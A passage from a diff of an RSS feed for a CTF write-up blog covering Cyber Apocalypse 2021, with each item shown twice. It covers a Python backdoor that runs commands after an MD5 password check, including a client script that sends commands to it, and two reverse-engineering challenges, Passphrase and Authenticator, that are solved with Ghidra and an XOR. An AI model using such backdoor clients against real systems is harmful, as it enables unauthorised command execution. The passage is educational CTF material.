+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;An output folder is created that contains all the decompressed data.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-backdoor-pythoncode.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;The majority of this is dependencies &lt;code&gt;db.py&lt;/code&gt; is is the most interesting. It contains an simple socket implementation that listens for connections providing the md5 sum of a specific string and then executing commands that follow.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-backdoor-dbpy.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Note: the local version of the script as show isn&amp;rsquo;t quiet right. All the strings need to be typed as bytes but weren&amp;rsquo;t by the extractor.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;With this info, a script can be created that opens a connection with the remote target, sends &lt;code&gt;s4v3_th3_w0rld&lt;/code&gt;, and then executes commands to retrieve the flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/python3&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; socket
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; readline
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; hashlib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; md5
+
+server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;127.0.0.1&amp;#34;&lt;/span&gt;
+port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4433&lt;/span&gt;
+password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;s4v3_th3_w0rld&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; True:
+    command &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;gt;&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; command &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt;:
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Exiting...&amp;#34;&lt;/span&gt;)
+        exit()
+    data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ( &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; command:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; command)
+    s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((server, port))
+    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendall((md5(password)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; command:&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; data)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
+    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It&amp;rsquo;s important to remember the server will only receive 32 bytes of data. Anything sent beyond that will be cut off and likely cause an error.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Cyber Apocalypse 2021: Passphrase</title>
+      <link>http://nightwolf56.github.io/ctf-writeups/ca-passphrase/</link>
+      <pubDate>Sun, 25 Apr 2021 00:00:00 -0100</pubDate>
+      
+      <guid>http://nightwolf56.github.io/ctf-writeups/ca-passphrase/</guid>
+      <description>&lt;p&gt;Passphrase is a ELF 64 bit executable. It is dynamically linked and is not stripped for debug symbols.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file passphrase
+passphrase: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;60f6b6064d2e34a2b6a24dda9feb943b0b8c360f, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Strings doens&amp;rsquo;t reveal a whole lot of info. The binary prompts for a &amp;ldquo;secret passphrase&amp;rdquo;. If it is correct, it asks that a message, presumably the flag, be taken to the chief.&lt;/p&gt;
+&lt;p&gt;Since the executable is not stripped when it is opened in Ghidra main() is clearly listed in the functions section of the symbol tree.&lt;/p&gt;
+&lt;p&gt;There a load of variables are initialized.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-passphrase-vars.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;They are then set to various hex values while the prompt for a &amp;ldquo;secret passphrase&amp;rdquo; is output.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;collect input
+compare input with string of variable values
+
+if match{
+    Success
+}
+else{
+    Denied
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value user input is being compared to can be determined by converting the values of each variable to ASCII. Combine these values and we have retrieved the flag&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Cyber Apocalypse 2021: Passphrase</title>
+      <link>http://nightwolf56.github.io/posts/ca-passphrase/</link>
+      <pubDate>Sun, 25 Apr 2021 00:00:00 -0100</pubDate>
+      
+      <guid>http://nightwolf56.github.io/posts/ca-passphrase/</guid>
+      <description>&lt;p&gt;Passphrase is a ELF 64 bit executable. It is dynamically linked and is not stripped for debug symbols.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file passphrase
+passphrase: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;60f6b6064d2e34a2b6a24dda9feb943b0b8c360f, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Strings doens&amp;rsquo;t reveal a whole lot of info. The binary prompts for a &amp;ldquo;secret passphrase&amp;rdquo;. If it is correct, it asks that a message, presumably the flag, be taken to the chief.&lt;/p&gt;
+&lt;p&gt;Since the executable is not stripped when it is opened in Ghidra main() is clearly listed in the functions section of the symbol tree.&lt;/p&gt;
+&lt;p&gt;There a load of variables are initialized.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-passphrase-vars.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;They are then set to various hex values while the prompt for a &amp;ldquo;secret passphrase&amp;rdquo; is output.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;collect input
+compare input with string of variable values
+
+if match{
+    Success
+}
+else{
+    Denied
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The value user input is being compared to can be determined by converting the values of each variable to ASCII. Combine these values and we have retrieved the flag&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Cyber Apocalypse 2021: Authenticator</title>
+      <link>http://nightwolf56.github.io/ctf-writeups/ca-authenticator/</link>
+      <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://nightwolf56.github.io/ctf-writeups/ca-authenticator/</guid>
+      <description>&lt;p&gt;Authenticator is a ELF 64 bit executable. It is dynamically linked and is not stripped for debug symbols&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file authenticator
+authenticator: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;66286657ca5a06147189b419238b2971b11c72db, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Strings shows a lot of standard stuff and a few things that are likely directly related to this challenge. There are a couple of what seem to be dialog lines, mention of a flag and a rather strange sequence of, &lt;code&gt;}a:Vh|}a:g}8j=}89gV&amp;lt;p&amp;lt;}:dV8&amp;lt;Vg9}V&amp;lt;9V&amp;lt;:j|{:&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Since the file is not stripped, main is listed in Ghidra&amp;rsquo;s symbol tree under functions.&lt;/p&gt;
+&lt;p&gt;The program prompts for input of a username and a pin. If they are both correct, the then a success message is output. The username is show to be &lt;code&gt;11337&lt;/code&gt; but the pin provided by the user is passed to another function and it&amp;rsquo;s return value is evaluated.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-authenticator-main-light.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;get username
+if username == 11337 {
+    get pin
+    chekpin(pin)
+    if pin == correct value {
+        Suceess
+    }
+    else {
+        Access denied
+    }
+}
+else {
+    Access denied
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the check pin function, the odd string we noticed earlier is XOR&amp;rsquo;d with the key of &lt;code&gt;9U&lt;/code&gt; and the value is compared with the pin provided by the user.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-authenticator-checkpin.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;XOR &lt;code&gt;}a:Vh|}a:g}8j=}89gV&amp;lt;p&amp;lt;}:dV8&amp;lt;Vg9}V&amp;lt;9V&amp;lt;:j|{:&lt;/code&gt; with &lt;code&gt;9U&lt;/code&gt; and the result is the value of the flag once it is wrapped in the flag format CHTB{}.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Cyber Apocalypse 2021: Authenticator</title>
+      <link>http://nightwolf56.github.io/posts/ca-authenticator/</link>
+      <pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate>
+      
+      <guid>http://nightwolf56.github.io/posts/ca-authenticator/</guid>
+      <description>&lt;p&gt;Authenticator is a ELF 64 bit executable. It is dynamically linked and is not stripped for debug symbols&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ file authenticator
+authenticator: ELF 64-bit LSB shared object, x86-64, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sha1&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;66286657ca5a06147189b419238b2971b11c72db, not stripped
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Strings shows a lot of standard stuff and a few things that are likely directly related to this challenge. There are a couple of what seem to be dialog lines, mention of a flag and a rather strange sequence of, &lt;code&gt;}a:Vh|}a:g}8j=}89gV&amp;lt;p&amp;lt;}:dV8&amp;lt;Vg9}V&amp;lt;9V&amp;lt;:j|{:&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Since the file is not stripped, main is listed in Ghidra&amp;rsquo;s symbol tree under functions.&lt;/p&gt;
+&lt;p&gt;The program prompts for input of a username and a pin. If they are both correct, the then a success message is output. The username is show to be &lt;code&gt;11337&lt;/code&gt; but the pin provided by the user is passed to another function and it&amp;rsquo;s return value is evaluated.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-authenticator-main-light.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;get username
+if username == 11337 {
+    get pin
+    chekpin(pin)
+    if pin == correct value {
+        Suceess
+    }
+    else {
+        Access denied
+    }
+}
+else {
+    Access denied
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the check pin function, the odd string we noticed earlier is XOR&amp;rsquo;d with the key of &lt;code&gt;9U&lt;/code&gt; and the value is compared with the pin provided by the user.&lt;/p&gt;
+&lt;p&gt;&lt;img  src=&#34;http://nightwolf56.github.io/img/ca-authenticator-checkpin.png&#34;
+        alt/&gt;&lt;/p&gt;
+&lt;p&gt;XOR &lt;code&gt;}a:Vh|}a:g}8j=}89gV&amp;lt;p&amp;lt;}:dV8&amp;lt;Vg9}V&amp;lt;9V&amp;lt;:j|{:&lt;/code&gt; with &lt;code&gt;9U&lt;/code&gt; and the result is the value of the flag once it is wrapped in the flag format CHTB{}.&lt;/p&gt;
+</description>
+    </item>
     
   </channel>
 </rss>
